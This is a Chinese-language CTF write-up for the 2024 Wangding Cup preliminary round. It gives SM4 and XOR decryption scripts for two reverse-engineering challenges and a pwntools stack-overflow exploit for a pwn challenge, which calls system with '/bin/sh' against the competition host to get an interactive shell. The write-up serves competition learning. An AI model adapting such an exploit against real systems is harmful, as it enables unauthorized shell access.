---
title: 2024网鼎杯初赛-青龙组WriteUp
date: 2024-10-29 20:13:18
updated: 2024-10-29 20:16:17
slug: wangdingcup2024-write
categories:
  - 未分类
---

### 网鼎杯2024-青龙组Wp
大家晚上好呀w！是今天比完赛的小鸟过来赶工的Wp，正好官方也要征求wp，小鸟就随便写点在战队里打的题目ww

今年的题目一半吧，听别的人说 crypto题目是照搬的....(小鸟叹气)

小鸟把Rev都ak惹w！(啾啾！)

题解蛮敷衍的，请各位不要太认真了！
~~主要是网鼎的题目没什么好说的？！！~~

### 1.Rev01
用Reacf打开看了一眼Apk文件，发现没什么特别的，没找到主类，去so里看
发现了SM4的特征，在网上搜集到了解密的脚本
但是用工具硬生生把密文怼出来了。
题解脚本如下：
```cpp
#include <iostream>
#include <cstring>
#include "sm4.h"

using namespace std;

const unsigned char Sbox[256] = { 0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05, 0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99, 0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62, 0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6, 0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8, 0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35, 0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87, 0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e, 0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1, 0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3, 0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f, 0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51, 0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8, 0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0, 0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84, 0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48 };
const unsigned int CK[32] = { 0x00070E12, 0x1C232A36, 0x383F464A, 0x545B626E, 0x70777E82, 0x8C939AA6, 0xA8AFB6BA, 0xC4CBD2DE, 0xE0E7EEF2, 0xFC030A16, 0x181F262A, 0x343B424E, 0x50575E62, 0x6C737A86, 0x888F969A, 0xA4ABB2BE, 0xC0C7CED2, 0xDCE3EAF6, 0xF8FF060A, 0x141B222E, 0x30373E42, 0x4C535A66, 0x686F767A, 0x848B929E, 0xA0A7AEB2, 0xBCC3CAD6, 0xD8DFE6EA, 0xF4FB020E, 0x10171E22, 0x2C333A46, 0x484F565A, 0x646B727E };
static const unsigned long FK[4] = { 0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc };

static inline unsigned char sm4Sbox(unsigned char inch) {
    return Sbox[inch];
}

static unsigned long sm4CaliRk(unsigned long ka) {
    unsigned long bb = 0;
    unsigned char a[4], b[4];
    PUT_ULONG_BE(ka, a, 0);
    for (int i = 0; i < 4; ++i) b[i] = sm4Sbox(a[i]);
    GET_ULONG_BE(bb, b, 0);
    return bb ^ ROTL(bb, 13) ^ ROTL(bb, 23);
}

static void sm4_setkey(unsigned long SK[32], unsigned char key[16]) {
    unsigned long MK[4], k[36];
    for (int i = 0; i < 4; i++) GET_ULONG_BE(MK[i], key, i * 4);
    for (int i = 0; i < 4; i++) k[i] = MK[i] ^ FK[i];
    for (int i = 0; i < 32; i++) {
        k[i + 4] = k[i] ^ sm4CaliRk(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ CK[i]);
        SK[i] = k[i + 4];
    }
}

void sm4_setkey_enc(sm4_context *ctx, unsigned char key[16]) {
    ctx->mode = SM4_ENCRYPT;
    sm4_setkey(ctx->sk, key);
}

static unsigned long sm4Lt(unsigned long ka) {
    unsigned char a[4], b[4];
    unsigned long bb = 0;
    PUT_ULONG_BE(ka, a, 0);
    for (int i = 0; i < 4; ++i) b[i] = Sbox[a[i]];
    GET_ULONG_BE(bb, b, 0);
    return bb ^ ROTL(bb, 2) ^ ROTL(bb, 10) ^ ROTL(bb, 18) ^ ROTL(bb, 24);
}

static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2, unsigned long x3, unsigned long rk) {
    return x0 ^ sm4Lt(x1 ^ x2 ^ x3 ^ rk);
}

static void sm4_one_round(unsigned long sk[32], unsigned char input[16], unsigned char output[16]) {
    unsigned long ulbuf[36] = {0};
    for (int i = 0; i < 4; i++) GET_ULONG_BE(ulbuf[i], input, i * 4);
    for (int i = 0; i < 32; i++) ulbuf[i + 4] = sm4F(ulbuf[i], ulbuf[i + 1], ulbuf[i + 2], ulbuf[i + 3], sk[i]);
    for (int i = 0; i < 4; i++) PUT_ULONG_BE(ulbuf[35 - i], output, i * 4);
}

void sm4_crypt_ecb(sm4_context *ctx, int mode, int length, unsigned char *input, unsigned char *output) {
    while (length > 0) {
        sm4_one_round(ctx->sk, input, output);
        input += 16;
        output += 16;
        length -= 16;
    }
}

void sm4_setkey_dec(sm4_context *ctx, unsigned char key[16]) {
    ctx->mode = SM4_DECRYPT;
    sm4_setkey(ctx->sk, key);
    for (int i = 0; i < 16; ++i) SWAP(ctx->sk[i], ctx->sk[31 - i]);
}

void sm4_crypt_cbc(sm4_context *ctx, int mode, int length, unsigned char iv[16], unsigned char *input, unsigned char *output) {
    int i;
    unsigned char temp[16];
    if (mode == SM4_ENCRYPT) {
        while (length > 0) {
            for (i = 0; i < 16; ++i) output[i] = input[i] ^ iv[i];
            sm4_one_round(ctx->sk, output, output);
            memcpy(iv, output, 16);
            input += 16;
            output += 16;
            length -= 16;
        }
    } else {
        while (length > 0) {
            memcpy(temp, input, 16);
            sm4_one_round(ctx->sk, input, output);
            for (i = 0; i < 16; ++i) output[i] ^= iv[i];
            memcpy(iv, temp, 16);
            input += 16;
            output += 16;
            length -= 16;
        }
    }
}

int main() {
    unsigned char key[16] = {0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54, 0x32, 0x10};
    unsigned char input[48] = { /* 填充输入数据 */ };
    unsigned char output[48];
    sm4_context ctx;

    sm4_setkey_dec(&ctx, key);
    sm4_crypt_ecb(&ctx, SM4_DECRYPT, 48, input, output);

    cout << "解密结果：" << endl;
    for (unsigned char c : output) cout << hex << (int)c << " ";
    cout << endl;
    return 0;
}

```
然后需要用别的语言写一个实现，我这里用的Python 前文中也是利用python解开的字符串
直接十六进制数组中的每个元素转换为对应的字符 

```python
a=[0x64 ,0x61, 0x31, 0x31, 0x61 ,0x36 ,0x35 ,0x34 ,0x2d, 0x36, 0x64 ,0x33 ,0x62, 0x2d, 0x34 ,0x36 ,0x34 ,0x63 ,0x2d ,0x61, 0x62, 0x31, 0x35, 0x2d ,0x37 ,0x39, 0x32, 0x36,0x31 ,0x38,0x63,0x66,0x61,0x63,0x37,0x66] 
for i in a:
 print(chr(i),end="") 

```

### 2.Rev02
通过逆向拿到密钥跟数组，进行解密，后半段也在代码里，丢到cyberchef里就能出后半段
[![233](https://me.owo.today/wp-content/uploads/2024/10/1730203320-233-300x213.png "233")](https://me.owo.today/wp-content/uploads/2024/10/1730203320-233-300x213.png "233")

```python
a = [0x72, 0xca, 0x70, 0x6a, 0x6a, 0xc4, 0xc2, 0xca]
decoded_chars = ''.join(chr(i // 2) for i in a)
print(decoded_chars, end="")

key = "XorrLord"
enc = [96, 9, 75, 0x13, 0x2d, 0xe, 0x14, 0x1]

decrypted_chars = ''.join(chr(enc[i] ^ ord(key[i])) for i in range(len(enc)))
print(decrypted_chars)
```

后半段密钥是AesMasterAesMast此过程便不再赘述

### Pwn 02
很简单的栈溢出题目，按照CTFWiki上说的示例都解开
exp：
```python
import os
from pwn import *
import sys
from ctypes import *
io = remote('0192d712cbfe7e048a6291f5f7e62377.6fm8.dg01.ciihw.cn', 45531)
elf = ELF("./short")
system_plt = elf.plt["system"]
bin_sh = 0x0804a038 # "/bin/sh" 字符串的地址
io.sendlineafter(b"username: ", b"admin")
io.sendlineafter(b"password: ", b"admin123")
io.recvuntil(b"You will input this: ")
buff_addr = int(io.recv(10), 16) # hex
log.info("buf_add: " + hex(buff_addr))
# 构造 payload
payload = b"a" * 4
payload += p32(0x080483fa)
payload += p32(system_plt)
payload += b"aaaa"
payload += p32(bin_sh)
payload = payload.ljust(0x50, b"\x00")
payload += p32(buff_addr)
payload += p32(0x08048674) 
io.sendlineafter(b"plz input your msg:\n", payload)
io.sendline(payload)
io.interactive()
``` 

### 结语
蛮好玩的题目，几个队友没啥作用也没啥事，但是crypto只改了个背景就当题目也太敷衍了....//

夏鸢还在等她的Ena，呜呜呜
![](https://me.owo.today/wp-content/uploads/2024/10/1730203977-20241017165940Aicy-211x300.png)
我不想去外地打比赛~！（小鸟啾啾以视抗议！

